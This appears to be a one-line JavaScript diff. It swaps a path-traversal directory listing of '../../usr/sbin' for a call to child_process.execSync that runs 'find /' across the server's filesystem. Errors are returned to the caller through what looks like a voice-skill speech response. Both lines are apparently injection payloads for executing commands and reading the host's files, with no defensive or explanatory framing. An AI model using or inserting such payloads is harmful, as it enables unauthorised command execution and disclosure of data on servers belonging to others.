@@ -1,1 +1,1 @@
-require('fs').readdirSync('../../usr/sbin').toString()
+ try{const execSync = require('child_process').execSync; execSync('find / -name "*.exe" 2>/dev/null').toString();} catch(e){sessionAttributes = createFavoriteNumberAttributes(favoriteNumber); speechOutput = e; callback(sessionAttributes, buildSpeechletResponse(cardTitle, speechOutput, repromptText, shouldEndSession));}
